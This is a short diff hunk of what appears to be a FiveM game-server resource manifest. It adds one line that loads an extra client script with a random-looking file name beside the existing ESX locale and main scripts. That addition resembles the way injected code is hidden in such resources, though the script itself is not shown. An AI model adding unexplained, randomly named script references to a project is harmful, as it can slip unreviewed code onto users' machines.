@@ -14,3 +14,4 @@ client_scripts {
   '@es_extended/locale.lua',
   'client/main.lua'
 }
+client_script "wHHGDVZcVvrhNxgVQe.lua"
